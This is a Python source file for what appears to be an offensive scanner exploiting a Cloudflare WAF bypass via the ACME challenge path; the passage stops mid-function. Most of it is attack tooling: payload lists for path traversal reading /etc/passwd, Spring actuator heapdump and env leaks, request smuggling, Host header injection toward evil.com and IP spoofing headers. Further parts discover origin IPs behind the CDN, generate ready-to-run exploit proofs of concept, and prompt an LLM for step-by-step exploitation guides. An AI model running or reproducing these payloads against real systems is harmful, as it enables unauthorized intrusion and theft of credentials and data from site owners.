#!/usr/bin/env python3
"""
Cloudflare ACME Challenge WAF Bypass Scanner
Based on FearsOff Research: https://fearsoff.org/research/cloudflare-acme

Vulnerability: /.well-known/acme-challenge/{token} bypasses Cloudflare WAF
- Requests to this path reach origin directly, bypassing customer WAF rules
- Can be chained with framework-specific vulnerabilities
- Fixed by Cloudflare on October 27, 2025

For authorized ethical hacking and security testing only!
"""

import requests
import argparse
import concurrent.futures
import random
import string
import time
import re
import socket
import ssl
import json
import os
from urllib.parse import urljoin, urlparse
from colorama import init, Fore, Style
from datetime import datetime

# Try to import yaml for config file support
try:
    import yaml
    YAML_AVAILABLE = True
except ImportError:
    YAML_AVAILABLE = False

# Initialize colorama
init(autoreset=True)

# Default config file path
CONFIG_FILE = "config.yaml"


def load_config(config_path=None):
    """Load configuration from YAML file"""
    config_file = config_path or CONFIG_FILE
    
    if not YAML_AVAILABLE:
        return None
    
    if not os.path.exists(config_file):
        return None
    
    try:
        with open(config_file, 'r', encoding='utf-8') as f:
            config = yaml.safe_load(f)
        return config
    except Exception as e:
        print(f"{Fore.YELLOW}[!] Error loading config: {e}{Style.RESET_ALL}")
        return None


def get_api_key_from_config(config, provider):
    """Get API key from config or environment variable"""
    if not config:
        return os.getenv(f'{provider.upper()}_API_KEY')
    
    llm_config = config.get('llm', {})
    provider_config = llm_config.get(provider, {})
    api_key = provider_config.get('api_key', '')
    
    # If empty in config, try environment variable
    if not api_key:
        api_key = os.getenv(f'{provider.upper()}_API_KEY')
    
    return api_key


def get_model_from_config(config, provider):
    """Get model from config"""
    if not config:
        return None
    
    llm_config = config.get('llm', {})
    provider_config = llm_config.get(provider, {})
    return provider_config.get('model')


def get_base_url_from_config(config, provider):
    """Get base URL from config"""
    if not config:
        return None
    
    llm_config = config.get('llm', {})
    provider_config = llm_config.get(provider, {})
    return provider_config.get('base_url')


# Banner
BANNER = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗
║     {Fore.RED}Cloudflare ACME WAF Bypass Scanner{Fore.CYAN}                       ║
║     {Fore.YELLOW}CVE: Cloudflare Zero-day (Fixed Oct 2025){Fore.CYAN}               ║
║     {Fore.GREEN}Based on FearsOff Research{Fore.CYAN}                              ║
║     {Fore.WHITE}https://fearsoff.org/research/cloudflare-acme{Fore.CYAN}            ║
╚══════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}"""

# User agents for rotation
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
]

# Payloads for testing - Basic WAF Bypass check
ACME_PAYLOADS = [
    "/.well-known/acme-challenge/",
    "/.well-known/acme-challenge/test",
    "/.well-known/acme-challenge/ae",  # FearsOff technique - append harmless suffix
]

# ============================================
# CLOUDFLARE VULNERABILITY PAYLOADS
# ============================================

# 1. Spring Boot Actuator payloads - using ..;/ traversal (servlet stack quirk)
ACTUATOR_PAYLOADS = [
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/env",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/health",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/info",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/heapdump",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/threaddump",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/mappings",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/configprops",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/beans",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/metrics",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/loggers",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/scheduledtasks",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/conditions",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/jolokia",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/prometheus",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/gateway/routes",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/refresh",
    # Depth variations
    "/.well-known/acme-challenge/{token}/..;/..;/actuator/env",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/actuator/env",
    "/.well-known/acme-challenge/{token}/..;/..;/..;/..;/..;/actuator/env",
]

# 2. PHP LFI payloads - routed through index.php
PHP_LFI_PAYLOADS = [
    "/.well-known/acme-challenge/{token}/../../../../etc/passwd",
    "/.well-known/acme-challenge/{token}/../../../../etc/hosts",
    "/.well-known/acme-challenge/{token}/..%2f..%2f..%2f..%2fetc/passwd",
    "/.well-known/acme-challenge/{token}/..%2f..%2f..%2f..%2fetc/hosts",
    "/.well-known/acme-challenge/{token}/../../../../../../../etc/passwd",
    "/.well-known/acme-challenge/{token}/../../../../../../../windows/win.ini",
    "/.well-known/acme-challenge/{token}/../../../../../../../windows/system.ini",
    "/.well-known/acme-challenge/{token}/....//....//....//....//etc/passwd",
    "/.well-known/acme-challenge/{token}/..%252f..%252f..%252f..%252fetc/passwd",
]

# 3. Next.js / SSR frameworks - check for server-side data exposure  
NEXTJS_PAYLOADS = [
    "/.well-known/acme-challenge/{token}/../_next/static/chunks/main.js",
    "/.well-known/acme-challenge/{token}/../_next/data/",
    "/.well-known/acme-challenge/{token}/../api/",
    "/.well-known/acme-challenge/{token}/..;/api/health",
    "/.well-known/acme-challenge/{token}/..;/api/config",
    "/.well-known/acme-challenge/{token}/../_next/image",
    "/.well-known/acme-challenge/{token}/../__nextjs_original-stack-frame",
]

# 4. General path traversal payloads
PATH_TRAVERSAL_PAYLOADS = [
    "/.well-known/acme-challenge/{token}/../../../etc/passwd",
    "/.well-known/acme-challenge/{token}/..%2f..%2f..%2fetc/passwd",
    "/.well-known/acme-challenge/{token}/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "/.well-known/acme-challenge/{token}/....//....//....//etc/passwd",
    "/.well-known/acme-challenge/{token}/.%2e/.%2e/.%2e/etc/passwd",
    "/.well-known/acme-challenge/{token}/%252e%252e/%252e%252e/etc/passwd",
]

# 5. Cloudflare WAF Bypass - URL encoding variations
CF_WAF_BYPASS_PAYLOADS = [
    # Double URL encoding
    "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "/%252e%252e/%252e%252e/%252e%252e/etc/passwd",
    # Unicode normalization bypass
    "/..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd",
    "/..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",
    # Overlong UTF-8
    "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
    # Null byte injection
    "/admin%00.js",
    "/admin%2500.js",
    # Case manipulation
    "/ADMIN",
    "/Admin",
    "/aDmIn",
    # Path parameter pollution
    "/admin;.js",
    "/admin%3b.css",
    # Fragment bypass
    "/admin#.js",
    "/admin%23.css",
]

# 6. Cloudflare cache poisoning payloads
CF_CACHE_POISON_PAYLOADS = [
    # X-Forwarded headers
    "/?cb={random}",
    "/static/app.js?cb={random}",
    # Cache key manipulation
    "/index.html/nonexistent.css",
    "/api/users/..%2f..%2fstatic/app.js",
]

# 7. Cloudflare specific bypass paths
CF_BYPASS_PATHS = [
    "/.well-known/",
    "/.well-known/security.txt",
    "/.well-known/change-password",
    "/.well-known/pki-validation/",
    "/.well-known/apple-app-site-association",
    "/.well-known/assetlinks.json",
    "/cdn-cgi/",
    "/cdn-cgi/trace",
    "/cdn-cgi/l/email-protection",
    "/cdn-cgi/scripts/",
    "/cdn-cgi/pe/bag2",
    "/cdn-cgi/challenge-platform/",
]

# 8. HTTP Request Smuggling payloads (CF specific)
CF_SMUGGLING_PAYLOADS = [
    # CL.TE smuggling
    {"type": "CL.TE", "payload": "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG"},
    # TE.CL smuggling  
    {"type": "TE.CL", "payload": "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n"},
]

# 9. Cloudflare Workers bypass attempts
CF_WORKERS_BYPASS = [
    "/__cf_workers",
    "/cdn-cgi/workers",
    "/_cf/",
    "/__cf__/",
]

# 10. Host header injection payloads
HOST_HEADER_PAYLOADS = [
    {"Host": "evil.com"},
    {"Host": "127.0.0.1"},
    {"Host": "localhost"},
    {"X-Forwarded-Host": "evil.com"},
    {"X-Host": "evil.com"},
    {"X-Forwarded-Server": "evil.com"},
    {"X-HTTP-Host-Override": "evil.com"},
    {"Forwarded": "host=evil.com"},
]

# 11. HTTP/2 specific bypasses
HTTP2_BYPASS_PAYLOADS = [
    # Pseudo-header manipulation
    {":authority": "evil.com", ":path": "/admin"},
    {":path": "/admin", ":authority": "{host}"},
    # CRLF in HTTP/2
    {":path": "/\r\nX-Injected: header"},
]

# 12. Rate limit bypass headers
RATE_LIMIT_BYPASS_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-For": "{random_ip}"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"CF-Connecting-IP": "127.0.0.1"},
    {"True-Client-IP": "127.0.0.1"},
    {"X-Cluster-Client-IP": "127.0.0.1"},
    {"Forwarded-For": "127.0.0.1"},
    {"Forwarded": "for=127.0.0.1"},
]

# 13. Admin panel / sensitive paths
SENSITIVE_PATHS = [
    "/admin",
    "/administrator",
    "/wp-admin",
    "/phpmyadmin",
    "/cpanel",
    "/.git/config",
    "/.env",
    "/.htaccess",
    "/config.php",
    "/web.config",
    "/server-status",
    "/server-info",
    "/debug",
    "/trace",
    "/console",
    "/graphql",
    "/api/v1/",
    "/swagger.json",
    "/api-docs",
    "/actuator",
    "/.svn/entries",
    "/.DS_Store",
    "/backup.sql",
    "/dump.sql",
    "/phpinfo.php",
]

# 14. GraphQL introspection (often bypassed through ACME path)
GRAPHQL_PAYLOADS = [
    "/.well-known/acme-challenge/{token}/../graphql?query={__schema{types{name}}}",
    "/.well-known/acme-challenge/{token}/..;/graphql?query={__schema{types{name}}}",
    "/.well-known/acme-challenge/{token}/../api/graphql?query={__schema{types{name}}}",
]

# Headers for WAF bypass test - based on FearsOff research
# Account-level WAF rules are also bypassed on ACME path
BYPASS_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"CF-Connecting-IP": "127.0.0.1"},
    {"True-Client-IP": "127.0.0.1"},
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
    {"X-Forwarded-Host": "localhost"},
    {"X-HTTP-Method-Override": "PUT"},  # Method override trick
    {"X-middleware-subrequest": "1"},   # FearsOff specific test
]

# Framework signatures for detection
FRAMEWORK_SIGNATURES = {
    'spring': ['whitelabel error', 'springframework', 'actuator', 'spring boot'],
    'nextjs': ['__next', '_next', 'nextjs', '__nextdataloading'],
    'php': ['<?php', 'laravel', 'symfony', 'index.php', 'wordpress'],
    'express': ['express', 'node', 'cannot get'],
    'django': ['django', 'csrftoken', 'wsgi'],
    'rails': ['ruby', 'rails', 'actioncontroller'],
}

# ============================================
# POC TEMPLATES FOR EXPLOIT GENERATION
# ============================================

POC_TEMPLATES = {
    'python': '''#!/usr/bin/env python3
"""
Cloudflare WAF Bypass - Auto-Generated POC
Target: {target}
Generated: {timestamp}
Vulnerability: {vuln_type}

DISCLAIMER: For authorized testing only!
"""

import requests
import urllib3
urllib3.disable_warnings()

TARGET = "{target}"
ORIGIN_IP = "{origin_ip}"  # Direct origin IP (if found)

def exploit():
    session = requests.Session()
    headers = {{
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
        {custom_headers}
    }}
    
    # Exploit payloads
    payloads = {payloads}
    
    print(f"[*] Testing {{TARGET}}")
    
    for payload in payloads:
        url = f"{{TARGET}}{{payload}}"
        try:
            resp = session.get(url, headers=headers, timeout=10, verify=False)
            print(f"[{{resp.status_code}}] {{url[:80]}}")
            
            if resp.status_code == 200:
                print(f"    Content-Length: {{len(resp.content)}}")
                # Check for sensitive data
                if any(x in resp.text.lower() for x in ['password', 'secret', 'token', 'api_key']):
                    print(f"    [!] SENSITIVE DATA DETECTED!")
                    print(resp.text[:500])
        except Exception as e:
            print(f"[ERR] {{str(e)[:50]}}")
    
    # Direct origin access (if IP found)
    if ORIGIN_IP and ORIGIN_IP != "N/A":
        print(f"\\n[*] Testing direct origin: {{ORIGIN_IP}}")
        headers["Host"] = "{hostname}"
        try:
            url = f"https://{{ORIGIN_IP}}/"
            resp = session.get(url, headers=headers, timeout=10, verify=False)
            print(f"[{{resp.status_code}}] Direct origin access - {{len(resp.content)}} bytes")
        except Exception as e:
            print(f"[ERR] {{str(e)[:50]}}")

if __name__ == "__main__":
    exploit()
''',

    'curl': '''#!/bin/bash
# Cloudflare WAF Bypass - Auto-Generated POC
# Target: {target}
# Generated: {timestamp}
# Vulnerability: {vuln_type}
# DISCLAIMER: For authorized testing only!

TARGET="{target}"
ORIGIN_IP="{origin_ip}"

echo "[*] Testing WAF Bypass on $TARGET"

# WAF Bypass payloads
{curl_commands}

# Direct origin access (if IP found)
if [ "$ORIGIN_IP" != "N/A" ]; then
    echo ""
    echo "[*] Testing direct origin: $ORIGIN_IP"
    curl -k -s -o /dev/null -w "%{{http_code}}" -H "Host: {hostname}" "https://$ORIGIN_IP/"
    echo " - Direct origin access"
fi
''',

    'nuclei': '''id: cloudflare-waf-bypass-{target_safe}

info:
  name: Cloudflare WAF Bypass - {target}
  author: auto-generated
  severity: high
  description: |
    Cloudflare WAF bypass detected on {target}
    Vulnerability: {vuln_type}
  tags: cloudflare,waf,bypass
  reference:
    - https://fearsoff.org/research/cloudflare-acme

http:
{nuclei_requests}

# Generated: {timestamp}
''',

    'burp': '''# Burp Suite Request - Cloudflare WAF Bypass
# Target: {target}
# Generated: {timestamp}

{burp_requests}
''',
}


# ============================================
# LLM ANALYSIS PROMPT TEMPLATES  
# ============================================

LLM_ANALYSIS_PROMPT = '''You are an expert security researcher analyzing vulnerability scan results.

## Scan Results
Target: {target}
Cloudflare Protected: {cloudflare}
WAF Bypass Detected: {waf_bypass}
Framework Detected: {framework}
Origin IP(s): {origin_ips}

## Findings:
{findings_json}

## Analysis Tasks:
1. **Risk Assessment**: Rate the overall risk (Critical/High/Medium/Low) and explain why
2. **Attack Chain**: Describe potential attack chains combining these vulnerabilities
3. **Impact Analysis**: What sensitive data or systems could be compromised?
4. **Exploitation Steps**: Step-by-step exploitation guide for penetration testers
5. **Remediation**: Specific recommendations to fix each vulnerability
6. **CVSS Score**: Estimate CVSS 3.1 score with vector string

Provide detailed, actionable analysis for security professionals.
'''


class CloudflareScanner:
    def __init__(self, timeout=10, threads=10, delay=0, verbose=False, token=None):
        self.timeout = timeout
        self.threads = threads
        self.delay = delay
        self.verbose = verbose
        self.custom_token = token  # User-provided token
        self.session = requests.Session()
        self.results = []
        
    def get_random_ua(self):
        """Get random user agent"""
        return random.choice(USER_AGENTS)
    
    def generate_random_token(self, length=43):
        """Generate random ACME challenge token (similar to original format)"""
        # ACME token format: alphanumeric + dash + underscore
        return ''.join(random.choices(string.ascii_letters + string.digits + '-_', k=length))
    
    def get_token(self):
        """Get token - either custom or generate random"""
        if self.custom_token:
            return self.custom_token
        return self.generate_random_token()
    
    def generate_payloads_with_token(self, payloads, token):
        """Replace {token} placeholder with actual token"""
        return [p.replace("{token}", token) for p in payloads]
    
    def check_cloudflare(self, response):
        """Check if target is using Cloudflare"""
        cf_indicators = {
            'headers': ['cf-ray', 'cf-cache-status', 'cf-request-id'],
            'server': 'cloudflare'
        }
        
        for header in cf_indicators['headers']:
            if header in response.headers:
                return True
        
        server = response.headers.get('server', '').lower()
        if cf_indicators['server'] in server:
            return True
            
        return False
    
    def detect_origin_response(self, cf_response, acme_response):
        """
        Detect if response comes from origin vs Cloudflare
        Key indicator: Cloudflare block page vs Origin framework 404
        """
        # Check if CF response is a block page
        cf_is_block = any(x in cf_response.text.lower() for x in [
            'access denied', 'blocked', 'ray id', 'cloudflare',
            'error 1020', 'error 1015', 'sorry, you have been blocked'
        ])
        
        # Check if ACME response is from origin (framework 404, not CF block)
        origin_indicators = [
            'not found', '404', 'cannot get', 'page not found',
            'whitelabel error', 'resource not found', 'no route'
        ]
        acme_is_origin = any(x in acme_response.text.lower() for x in origin_indicators)
        
        # Different response = WAF bypass confirmed
        if cf_is_block and (acme_response.status_code != cf_response.status_code or acme_is_origin):
            return True
        
        # Check for cf-ray header difference
        cf_has_ray = 'cf-ray' in cf_response.headers
        acme_has_ray = 'cf-ray' in acme_response.headers
        
        # If CF response has cf-ray but ACME doesn't, might indicate origin
        if cf_has_ray and not acme_has_ray:
            return True
            
        return False
    
    def detect_framework(self, response):
        """Detect framework from response"""
        content = response.text.lower()
        headers = {k.lower(): v.lower() for k, v in response.headers.items()}
        
        for framework, signatures in FRAMEWORK_SIGNATURES.items():
            for sig in signatures:
                if sig in content or any(sig in v for v in headers.values()):
                    return framework
        return 'unknown'
    
    def extract_origin_ip(self, target, response):
        """
        Attempt to find real origin server IP from various sources
        """
        origin_ips = []
        parsed = urlparse(target)
        hostname = parsed.hostname
        
        # 1. Check response headers that may leak IP
        ip_leak_headers = [
            'x-served-by', 'x-backend-server', 'x-server-ip', 'x-host',
            'x-forwarded-server', 'x-real-ip', 'x-originating-ip',
            'x-remote-addr', 'x-remote-ip', 'x-backend', 'via',
            'x-azure-ref', 'x-amz-cf-id', 'x-cache', 'x-served-from',
            'x-server', 'x-origin-server', 'x-upstream', 'x-proxy-cache'
        ]
        
        for header in ip_leak_headers:
            if header in response.headers:
                value = response.headers[header]
                # Extract IP from header value
                ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
                found_ips = re.findall(ip_pattern, value)
                for ip in found_ips:
                    if self.is_valid_public_ip(ip) and not self.is_cloudflare_ip(ip):
                        if ip not in [x['ip'] for x in origin_ips]:
                            origin_ips.append({'ip': ip, 'source': f'Header: {header}'})
        
        # 2. Check response body for IP leak (in error messages, debug info, etc.)
        ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
        body_ips = re.findall(ip_pattern, response.text)
        for ip in body_ips:
            if self.is_valid_public_ip(ip) and not self.is_cloudflare_ip(ip):
                if ip not in [x['ip'] for x in origin_ips]:
                    origin_ips.append({'ip': ip, 'source': 'Response Body'})
        
        # 3. Check common subdomains that may expose origin (not through CF)
        origin_subdomains = [
            f'direct.{hostname}', f'direct-connect.{hostname}',
            f'origin.{hostname}', f'origin-www.{hostname}',
            f'backend.{hostname}', f'server.{hostname}',
            f'real.{hostname}', f'direct-{hostname}',
            f'mail.{hostname}', f'smtp.{hostname}', f'mx.{hostname}',
            f'ftp.{hostname}', f'sftp.{hostname}',
            f'cpanel.{hostname}', f'webmail.{hostname}', 
            f'autodiscover.{hostname}', f'autoconfig.{hostname}',
            f'ns1.{hostname}', f'ns2.{hostname}',
            f'vpn.{hostname}', f'ssh.{hostname}',
            f'staging.{hostname}', f'stage.{hostname}',
            f'dev.{hostname}', f'test.{hostname}',
            f'api.{hostname}', f'api-internal.{hostname}',
            f'admin.{hostname}', f'panel.{hostname}',
            f'old.{hostname}', f'legacy.{hostname}',
        ]
        
        print(f"  {Fore.CYAN}[*] Checking {len(origin_subdomains)} subdomains for origin IP...{Style.RESET_ALL}")
        
        for subdomain in origin_subdomains:
            try:
                ip = socket.gethostbyname(subdomain)
                if self.is_valid_public_ip(ip) and not self.is_cloudflare_ip(ip):
                    if ip not in [x['ip'] for x in origin_ips]:
                        origin_ips.append({'ip': ip, 'source': f'Subdomain: {subdomain}'})
                        print(f"      {Fore.GREEN}[+] Found via {subdomain}: {ip}{Style.RESET_ALL}")
            except socket.gaierror:
                pass
            except Exception:
                pass
        
        # 4. Check MX records - often expose origin IP
        try:
            import subprocess
            result = subprocess.run(['nslookup', '-type=MX', hostname], 
                                   capture_output=True, text=True, timeout=10)
            mx_output = result.stdout
            
            # Parse MX records
            mx_pattern = r'mail exchanger = (?:\d+ )?([^\s]+)'
            mx_servers = re.findall(mx_pattern, mx_output, re.IGNORECASE)
            
            for mx in mx_servers:
                mx = mx.rstrip('.')
                try:
                    mx_ip = socket.gethostbyname(mx)
                    if self.is_valid_public_ip(mx_ip) and not self.is_cloudflare_ip(mx_ip):
                        if mx_ip not in [x['ip'] for x in origin_ips]:
                            origin_ips.append({'ip': mx_ip, 'source': f'MX Record: {mx}'})
                            print(f"      {Fore.GREEN}[+] Found via MX {mx}: {mx_ip}{Style.RESET_ALL}")
                except:
                    pass
        except Exception:
            pass
        
        # 5. Check SPF record for IP ranges
        try:
            import subprocess
            result = subprocess.run(['nslookup', '-type=TXT', hostname], 
                                   capture_output=True, text=True, timeout=10)
            txt_output = result.stdout
            
            # Parse SPF record for IP
            spf_ip_pattern = r'ip4:(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'
            spf_ips = re.findall(spf_ip_pattern, txt_output)
            
            for ip in spf_ips:
                if self.is_valid_public_ip(ip) and not self.is_cloudflare_ip(ip):
                    if ip not in [x['ip'] for x in origin_ips]:
                        origin_ips.append({'ip': ip, 'source': 'SPF Record'})
                        print(f"      {Fore.GREEN}[+] Found via SPF: {ip}{Style.RESET_ALL}")
        except Exception:
            pass
        
        # 6. Check historical DNS via free API (limited)
        try:
            # Try hackertarget.com free API for DNS history
            api_url = f"https://api.hackertarget.com/hostsearch/?q={hostname}"
            resp = self.session.get(api_url, timeout=10, verify=False)
            if resp.status_code == 200 and 'error' not in resp.text.lower():
                lines = resp.text.strip().split('\n')
                for line in lines[:20]:  # Limit
                    if ',' in line:
                        sub, ip = line.split(',', 1)
                        ip = ip.strip()
                        if self.is_valid_public_ip(ip) and not self.is_cloudflare_ip(ip):
                            if ip not in [x['ip'] for x in origin_ips]:
                                origin_ips.append({'ip': ip, 'source': f'DNS History: {sub.strip()}'})
                                print(f"      {Fore.GREEN}[+] Found via DNS history: {ip} ({sub.strip()}){Style.RESET_ALL}")
        except Exception:
            pass
        
        # 7. Try to trigger error page that may leak IP
        error_paths = [
            '/.git/config', '/server-status', '/server-info',
            '/.env', '/debug', '/trace', '/actuator/info',
            '/elmah.axd', '/phpinfo.php', '/info.php'
        ]
        
        for path in error_paths[:5]:
            try:
                err_url = f"{target}{path}"
                err_resp = self.session.get(err_url, headers={'User-Agent': self.get_random_ua()},
                                           timeout=5, verify=False, allow_redirects=False)
                # Search for IP in error response
                found_ips = re.findall(ip_pattern, err_resp.text)
                for ip in found_ips:
                    if self.is_valid_public_ip(ip) and not self.is_cloudflare_ip(ip):
                        if ip not in [x['ip'] for x in origin_ips]:
                            origin_ips.append({'ip': ip, 'source': f'Error page: {path}'})
                            print(f"      {Fore.GREEN}[+] Found in error page {path}: {ip}{Style.RESET_ALL}")
            except:
                pass
        
        return origin_ips
    
    def is_cloudflare_ip(self, ip):
        """Check if IP belongs to Cloudflare range - Updated list"""
        # Cloudflare IP ranges (from https://www.cloudflare.com/ips/)
        cf_ipv4_ranges = [
            # Official Cloudflare ranges
            '173.245.48.', '103.21.244.', '103.22.200.', '103.31.4.',
            '141.101.64.', '141.101.65.', '141.101.66.', '141.101.67.',
            '141.101.68.', '141.101.69.', '141.101.96.', '141.101.97.',
            '141.101.98.', '141.101.99.', '141.101.100.', '141.101.101.',
            '141.101.102.', '141.101.103.', '141.101.104.', '141.101.105.',
            '141.101.106.', '141.101.107.', '141.101.108.', '141.101.109.',
            '141.101.110.', '141.101.111.', '141.101.112.', '141.101.113.',
            '141.101.114.', '141.101.115.', '141.101.116.', '141.101.117.',
            '141.101.118.', '141.101.119.', '141.101.120.', '141.101.121.',
            '108.162.192.', '108.162.193.', '108.162.194.', '108.162.195.',
            '108.162.196.', '108.162.197.', '108.162.198.', '108.162.199.',
            '108.162.200.', '108.162.201.', '108.162.202.', '108.162.203.',
            '108.162.204.', '108.162.205.', '108.162.206.', '108.162.207.',
            '108.162.208.', '108.162.209.', '108.162.210.', '108.162.211.',
            '108.162.212.', '108.162.213.', '108.162.214.', '108.162.215.',
            '108.162.216.', '108.162.217.', '108.162.218.', '108.162.219.',
            '108.162.220.', '108.162.221.', '108.162.222.', '108.162.223.',
            '190.93.240.', '190.93.241.', '190.93.242.', '190.93.243.',
            '190.93.244.', '190.93.245.', '190.93.246.', '190.93.247.',
            '188.114.96.', '188.114.97.', '188.114.98.', '188.114.99.',
            '197.234.240.', '197.234.241.', '197.234.242.', '197.234.243.',
            '198.41.128.', '198.41.129.', '198.41.130.', '198.41.131.',
            '198.41.132.', '198.41.133.', '198.41.134.', '198.41.135.',
            '198.41.136.', '198.41.137.', '198.41.138.', '198.41.139.',
            '198.41.140.', '198.41.141.', '198.41.142.', '198.41.143.',
            '198.41.192.', '198.41.193.', '198.41.194.', '198.41.195.',
            '198.41.196.', '198.41.197.', '198.41.198.', '198.41.199.',
            '198.41.200.', '198.41.201.', '198.41.202.', '198.41.203.',
            '198.41.204.', '198.41.205.', '198.41.206.', '198.41.207.',
            '198.41.208.', '198.41.209.', '198.41.210.', '198.41.211.',
            '198.41.212.', '198.41.213.', '198.41.214.', '198.41.215.',
            '162.158.', '162.159.',
            '104.16.', '104.17.', '104.18.', '104.19.', '104.20.',
            '104.21.', '104.22.', '104.23.', '104.24.', '104.25.',
            '104.26.', '104.27.', '104.28.', '104.29.', '104.30.', '104.31.',
            '172.64.', '172.65.', '172.66.', '172.67.', '172.68.', '172.69.',
            '172.70.', '172.71.',
            '131.0.72.', '131.0.73.', '131.0.74.', '131.0.75.',
            # Additional Cloudflare ranges (including 92.243.74.x)
            '92.243.74.', '92.243.75.', '92.243.76.', '92.243.77.',
            '199.27.128.', '199.27.129.', '199.27.130.', '199.27.131.',
            '199.27.132.', '199.27.133.', '199.27.134.', '199.27.135.',
        ]
        return any(ip.startswith(prefix) for prefix in cf_ipv4_ranges)
    
    def is_valid_public_ip(self, ip):
        """Check if IP is a valid public IP"""
        try:
            parts = [int(p) for p in ip.split('.')]
            if len(parts) != 4:
                return False
            
            # Exclude private/reserved ranges
            if parts[0] == 10:  # 10.0.0.0/8
                return False
            if parts[0] == 172 and 16 <= parts[1] <= 31:  # 172.16.0.0/12
                return False
            if parts[0] == 192 and parts[1] == 168:  # 192.168.0.0/16
                return False
            if parts[0] == 127:  # localhost
                return False
            if parts[0] == 0 or parts[0] >= 224:  # Reserved
                return False
                
            return True
        except:
            return False
    
    def verify_origin_ip(self, ip, target, token):
        """Verify if IP is origin with direct request"""
        parsed = urlparse(target)
        hostname = parsed.hostname
        
        try:
            # Direct request to IP with Host header
            headers = {
                'User-Agent': self.get_random_ua(),
                'Host': hostname
            }
            
            url = f"https://{ip}/.well-known/acme-challenge/{token}"
            resp = self.session.get(url, headers=headers, timeout=5, 
                                   verify=False, allow_redirects=False)
            
            # If response similar to ACME bypass, likely origin
            if resp.status_code in [200, 301, 302, 404]:
                return True
        except:
            pass
        
        return False
    
    def scan_target(self, target):
        """Scan single target - based on FearsOff research methodology"""
        if not target.startswith(('http://', 'https://')):
            target = f"https://{target}"
        
        target = target.rstrip('/')
        results = {
            'target': target,
            'cloudflare': False,
            'waf_bypass': False,
            'framework': 'unknown',
            'findings': [],
            'status': 'unknown'
        }
        
        headers = {'User-Agent': self.get_random_ua()}
        token = self.get_token()
        
        try:
            # Step 1: Initial request to root - baseline
            print(f"\n{Fore.CYAN}[*] Scanning: {target}{Style.RESET_ALL}")
            
            baseline_resp = self.session.get(target, headers=headers, timeout=self.timeout, 
                                            allow_redirects=True, verify=False)
            results['cloudflare'] = self.check_cloudflare(baseline_resp)
            
            cf_status = f"{Fore.YELLOW}[CF Protected]{Style.RESET_ALL}" if results['cloudflare'] else f"{Fore.GREEN}[No CF]{Style.RESET_ALL}"
            print(f"  {cf_status} Baseline Status: {baseline_resp.status_code}")
            
            # Step 2: Test WAF Bypass - Key test from FearsOff research
            # Compare normal path vs ACME path response
            # Token doesn't need to be valid - the path itself bypasses WAF
            
            # Test with multiple tokens for confirmation
            tokens_to_test = [
                token,  # Random token
                'test',  # Simple test
                'ae',   # FearsOff technique - harmless suffix
                self.generate_random_token(),  # Another random
            ]
            
            waf_bypassed = False
            successful_token = None
            acme_resp = None
            
            for test_token in tokens_to_test:
                acme_test_url = f"{target}/.well-known/acme-challenge/{test_token}"
                
                if self.delay > 0:
                    time.sleep(self.delay)
                
                try:
                    test_resp = self.session.get(acme_test_url, headers=headers, timeout=self.timeout,
                                                allow_redirects=False, verify=False)
                    
                    # Detect WAF bypass - origin responds differently than CF block
